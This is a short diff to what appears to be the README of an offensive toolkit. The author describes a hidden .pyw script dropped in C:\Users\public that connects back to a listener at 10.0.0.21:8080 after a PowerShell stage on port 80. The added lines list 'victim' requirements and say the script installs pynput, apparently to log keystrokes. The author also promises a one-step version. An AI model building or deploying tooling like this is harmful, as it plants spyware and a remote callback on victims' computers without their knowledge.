@@ -33,3 +33,7 @@ m.connect(("10.0.0.21", 8080)) - .pyw script
 </pre>
 in my case, the .ps1 was 10.0.0.21 on port 80, and the listener was on port 8080.<br>
 please, if you are having any problems, i would like to know. soon i will make a python script which will execute it all in one code. please notice that the .pyw script {python} saved at 'C:\Users\public' directory
+
+# Requirements
+Victim must have python installed on computer (python3)<br>
+Note: When script gets run, it will install using pip the 'pynput' package.
